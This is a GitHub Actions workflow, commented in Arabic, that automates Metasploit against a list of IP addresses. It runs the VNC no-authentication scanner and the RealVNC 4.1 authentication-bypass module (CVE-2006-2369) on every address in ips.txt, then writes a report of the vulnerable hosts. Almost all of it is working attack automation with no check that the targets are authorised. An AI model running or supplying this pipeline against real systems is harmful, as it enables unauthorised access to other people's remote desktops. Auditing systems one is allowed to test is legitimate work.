name: Kali VNC Vulnerability Scanner (Professional)

on:
  workflow_dispatch: # تشغيل يدوي

jobs:
  vnc_analysis:
    runs-on: ubuntu-latest
    container:
      image: kalilinux/kali-rolling
      options: --user root

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4 # تحديث للإصدار 4 كما طلبت

      - name: Install Professional Tools
        run: |
          apt-get update
          apt-get install -y metasploit-framework nmap python3 grep

      - name: Prepare Targets
        run: |
          # تنظيف ملف الأهداف واستخراج الـ IPs فقط
          if [ -f "ips.txt" ]; then
            grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" ips.txt | sort -u > clean_targets.txt
          else
            echo "127.0.0.1" > clean_targets.txt # هدف تجريبي في حال عدم وجود الملف
          fi

      - name: Execute Metasploit VNC Modules
        run: |
          # إنشاء سكربت الأتمتة لميتاسبولت
          cat <<EOF > vnc_logic.rc
          # 1. البحث عن الأنظمة بدون حماية تماماً
          use auxiliary/scanner/vnc/vnc_none_auth
          set RHOSTS file:clean_targets.txt
          set THREADS 10
          run

          # 2. اختبار ثغرة تخطي المصادقة CVE-2006-2369
          use auxiliary/admin/vnc/realvnc_41_bypass
          set RHOSTS file:clean_targets.txt
          run
          exit
          EOF

          # التشغيل الصامت وحفظ النتائج
          msfconsole -q -r vnc_logic.rc | tee raw_msf_results.txt

      - name: Advanced Results Parsing (Python)
        run: |
          python3 - <<EOF
          import os

          print("--- Processing Results ---")
          results_file = "raw_msf_results.txt"
          report_file = "vnc_final_report.md"

          with open(report_file, "w") as f:
              f.write("# VNC Security Audit Report\n\n")
              f.write("| Target IP | Status | Details |\n")
              f.write("|-----------|--------|---------|\n")

              if os.path.exists(results_file):
                  with open(results_file, "r") as r:
                      for line in r:
                          if "VULNERABLE" in line or "identified" in line:
                              parts = line.split()
                              ip = "Unknown"
                              for p in parts:
                                  if "." in p and p[0].isdigit(): ip = p
                              status = "VULNERABLE (Bypass)" if "VULNERABLE" in line else "Open (No Auth)"
                              f.write(f"| {ip} | **{status}** | {line.strip()} |\n")
          EOF

      - name: Upload Audit Results
        uses: actions/upload-artifact@v4 # تحديث للإصدار 4 كما طلبت
        with:
          name: vnc-audit-results
          path: |
            raw_msf_results.txt
            vnc_final_report.md
